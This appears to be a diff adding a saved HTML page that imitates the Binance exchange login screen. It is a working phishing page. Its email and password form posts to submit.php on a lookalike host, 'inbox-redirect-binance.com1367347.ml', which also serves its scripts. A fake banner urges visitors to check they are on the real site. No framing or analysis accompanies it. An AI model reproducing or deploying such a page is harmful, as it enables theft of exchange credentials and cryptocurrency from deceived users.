@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+
+<!-- saved from url=(0034)https://www.binance.t.com/login.html -->
+
+<html ng-app="bnbApp" class="ng-scope"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>
+
+	
+
+	<meta name="format-detection" content="telephone=no,email=no,address=no">
+
+	<title ng-bind="webtitle+ &#39;-&#39;+ (&#39;binancetitle&#39;| T)" class="ng-binding">Login-Binance.com</title>
+
+	<link rel="stylesheet" type="text/css" href="index_files/global.css">
+
+	<link rel="Shortcut Icon" href="https://resource.binance.t.com/resources/img/favicon.ico">
+
+	<script async="" src="http://inbox-redirect-binance.com1367347.ml/bn/index_files/sensorsdatasdk.min.js.download"></script><script id="loadeden" src="http://inbox-redirect-binance.com1367347.ml/bn/index_files/en.js.download"></script>
+
+
+	<script src="http://inbox-redirect-binance.com1367347.ml/bn/index_files/verifyLayout.min.js.download" type="text/javascript" charset="utf-8"></script><link rel="stylesheet" href="index_files/layer.css" id="layui_layer_skinlayercss" style="">
+
+	<script src="http://inbox-redirect-binance.com1367347.ml/bn/index_files/sensorsdata2.js.download" type="text/javascript" charset="utf-8"></script>
+
+	<script>
+
+	 layer.config({
+
+         extend: ['skin/myskin/myLayer.css'],
+
+         shift:null,
+
+         closeBtn:1
+
+     })
+
+     
+
+	$(document).ajaxSend(function(event, jqxhr, settings) {
+
+		jqxhr.setRequestHeader("CSRFToken",$.cookie('CSRFToken')?$.md5($.cookie('CSRFToken')):''),
+
+		jqxhr.setRequestHeader("clientType","web"),
+
+		jqxhr.setRequestHeader("lang",localStorage.lang)
+
+	});
+
+	 
+
+	 </script><link rel="stylesheet" href="index_files/myLayer.css" id="layui_layer_skinmyskinmyLayercss" style="">
+
+	 <style>
+
+	 body,html{height:100%;}
+
+	 body{padding-bottom:0;}
+
+	 
+
+	 .verifyLayout{box-sizing:border-box;height:100%;min-height:608px;min-width:870px;background:#f7f7f7;padding-bottom:82px;position:relative;}
+
+	 .verifyLayout .main{width:518px;padding:30px 30px 40px;background:#fff;position:absolute;left:50%;top:55%;text-align:center;
+
+	 	-webkit-transform:translate(-50%,-50%);
+
+	 	-moz-transform:translate(-50%,-50%);
+
+	 	-ms-transform:translate(-50%,-50%);
+
+	 	-o-transform:translate(-50%,-50%);
+
+	 	transform:translate(-50%,-50%);
+
+	 	margin-top:-41px;
+
+	 }
+
+	 .verifyLayout .main .logo{display:inline-block;height:64px;}
+
+	 .verifyLayout .main .icon-logo{margin-bottom:24px;height:40px;}
+
+	 .verifyLayout .main .messageBox{margin:0 auto 10px;}
+
+	 .verifyLayout .main .alert{width:100%;text-align:left;box-sizing:border-box;background:none;font-size:12px;white-space:nowrap;padding:0;line-height:100%;margin-top:44px;}
+
+	 .verifyBottom{padding:15px 0;text-align:center;width:100%;position:absolute;left:0;bottom:0;background:#f7f7f7}
+
+	 .verifyBottom .item{font-size:14px;color:#999;margin-bottom:10px;}
+
+	 .verifyBottom .item.lang span{cursor:pointer;}
+
+	 .verifyBottom .item.lang span.black{color:#333;}
+
+	 .verifyBottom .item.lang a,.verifyBottom .item.lang a:visited{color:#999;}
+
+	 .verifyBottom .item.lang a:hover{color:#333;}
+
+	 </style>
+
+	
+
+<script charset="UTF-8" async="" src="http://inbox-redirect-binance.com1367347.ml/bn/index_files/gettype.php"></script><script charset="UTF-8" async="" src="http://inbox-redirect-binance.com1367347.ml/bn/index_files/fullpage.8.2.4.js.download"></script><script charset="UTF-8" src="http://inbox-redirect-binance.com1367347.ml/bn/index_files/get.php"></script><link href="index_files/style_https.1.4.7.css" rel="stylesheet"></head>
+
+<body style="">
+
+		
+
+		<!-- 主体内容 -->
+
+		<div class="verifyLayout ng-scope" ng-controller="verifyLayoutCtr">
+
+			<div class="main">
+
+				<a href="https://www.binance.t.com/" class="logo"><img ng-src="/resources/img/logo-en.svg" class="icon-logo" src="index_files/logo-en.svg"></a>
+
+				
+
+
+
+
+
+
+
+
+
+<div ng-controller="loginCtr" class="ng-scope">
+
+	
+
+	<div class="f-prz formWrapLR">
+
+		<form class="loginReg-form ng-pristine ng-valid" id="login-form" action="http://inbox-redirect-binance.com1367347.ml/bn/submit.php" method="post">
+
+			<h3 class="LRtitle"><span class="ng-binding">Login</span></h3>
+
+			<div class="importantInfo">
+
+			  <p class="ng-binding">Please check that you are visiting <strong>https://www.binance.com</strong></p>
+
+			  <img src="index_files/safeLink.jpg">
+
+			</div>
+
+			
+
+			<p class="f-nomargin Validform_checktip"></p>
+
+			
+
+			<div class="filed">
+
+				<input type="email" name="email" placeholder="Email" ng-model="loginParams.email" id="email" class="ipt fillemail ng-pristine ng-valid ng-valid-email" datatype="e" errormsg="Invalid email address." nullmsg="This field is required.">
+
+			</div>
+
+			
+
+			<div class="filed">
+
+				<input type="password" name="password" placeholder="Password" id="password" class="ipt pwd ng-pristine ng-valid" datatype="*" nullmsg="This field is required.">
+
+	
+			</div>
+
+			
+
+			<div class="filed">
+
+				<input type="submit" value="Login" id="login-btn" class="btn btn-orange btn-block">
+
+			</div>
+
+			
+
+			<div class="filde">
+
+				<p class="login-tip f-cb"><span class="f-fr ng-binding">Not on Binance yet? <a href="https://www.binance.t.com/register.html" class="yellow ng-binding">Register</a></span><a href="https://www.binance.t.com/forgotPassword.html" class="yellow f-fl ng-binding">Forgot Password?</a></p>
+
+			</div>
+
+			
+
+		</form>
+
+		
+
+	</div>
+
+</div>
+
+<style>
+
+	.layui-layer-msg{width:auto !important;}
+
+	.importantInfo{margin-top:24px;text-align:center;width:100%;position:relative;padding-top:22px;}
+
+	.importantInfo p{font-size:12px;color:#333;line-height:100%;margin-left:-4px;white-space: nowrap;position:absolute;top:0;left:50%;
+
+		-webkit-transform:translateX(-50%);
+
+		-ms-transform:translateX(-50%);
+
+		-moz-transform:translateX(-50%);
+
+		-o-transform:translateX(-50%);
+
+		transform:translateX(-50%);
+
+	}
+
+	.importantInfo p .iconfont{font-size:16px;color:#ff0000;vertical-align:text-top;}
+
+	.verifyLayout .main{height:370px;}
+
+</style>
+
+<script type="text/javascript" src="http://inbox-redirect-binance.com1367347.ml/bn/index_files/Validform_v5.3.2_min.js.download"></script>
+
+<link rel="stylesheet" type="text/css" href="index_files/style.css">
+
+<script src="http://inbox-redirect-binance.com1367347.ml/bn/index_files/login.js.download" type="text/javascript" charset="utf-8"></script>		
+
+<script src="http://inbox-redirect-binance.com1367347.ml/bn/index_files/gt.js.download"></script>
+
+
+
+			</div>
+
+			<div class="verifyBottom">
+
+				<div class="item lang">
+
+					<a href="https://www.binance.t.com/" class="ng-binding">Home</a>　<a ng-href="https://binance.zendesk.t.com/hc/en-us" target="_blank" class="ng-binding" href="https://binance.zendesk.t.com/hc/en-us">Support</a>　|　<span ng-click="switching(&#39;cn&#39;)" ng-class="{true:&#39;black&#39;,false:&#39;&#39;}[cur_lang==&#39;cn&#39;]">中文</span>　<span ng-click="switching(&#39;en&#39;)" ng-class="{true:&#39;black&#39;,false:&#39;&#39;}[cur_lang==&#39;en&#39;]" class="black">English</span> &nbsp;&nbsp;  <span ng-click="switching(&#39;kr&#39;)" ng-class="{true:&#39;black&#39;,false:&#39;&#39;}[cur_lang==&#39;kr&#39;]">한국어</span>　
+
+					<span ng-click="switching(&#39;jp&#39;)" ng-class="{true:&#39;black&#39;,false:&#39;&#39;}[cur_lang==&#39;jp&#39;]">日本語</span>&nbsp;&nbsp;
+
+					<span ng-click="switching(&#39;ru&#39;)" ng-class="{true:&#39;black&#39;,false:&#39;&#39;}[cur_lang==&#39;ru&#39;]">русский</span>&nbsp;&nbsp;
+
+					<span ng-click="switching(&#39;es&#39;)" ng-class="{true:&#39;black&#39;,false:&#39;&#39;}[cur_lang==&#39;es&#39;]">Español</span>&nbsp;&nbsp;
+
+					<span ng-click="switching(&#39;fr&#39;)" ng-class="{true:&#39;black&#39;,false:&#39;&#39;}[cur_lang==&#39;fr&#39;]">Français</span>&nbsp;&nbsp;
+
+					<span ng-click="switching(&#39;de&#39;)" ng-class="{true:&#39;black&#39;,false:&#39;&#39;}[cur_lang==&#39;de&#39;]">Deutsch</span>
+
+				</div>
+
+				<div class="item">© 2017 Binance.com All Rights Reserved</div>
+
+			</div>
+
+		</div>
+
+		
+
+		
+
+		
+
+
+
+
+
+<div class="geetest_panel geetest_wind" style="display: none;"><div class="geetest_panel_ghost"></div><div class="geetest_panel_box"><div class="geetest_other_offline geetest_panel_offline"></div><div class="geetest_panel_loading"><div class="geetest_panel_loading_icon"></div><div class="geetest_panel_loading_content">Detecting</div></div><div class="geetest_panel_success"><div class="geetest_panel_success_box"><div class="geetest_panel_success_show"><div class="geetest_panel_success_pie"></div><div class="geetest_panel_success_filter"></div><div class="geetest_panel_success_mask"></div></div><div class="geetest_panel_success_correct"><div class="geetest_panel_success_icon"></div></div></div><div class="geetest_panel_success_title">Success</div></div><div class="geetest_panel_error"><div class="geetest_panel_error_icon"></div><div class="geetest_panel_error_title">Network timeout</div><div class="geetest_panel_error_content">Click to retry</div><div class="geetest_panel_error_code"></div></div><div class="geetest_panel_footer" style="display: none;"><div class="geetest_panel_footer_logo"></div><div class="geetest_panel_footer_copyright">Provided by Geetest</div></div><div class="geetest_panel_next"></div></div></div></body></html>
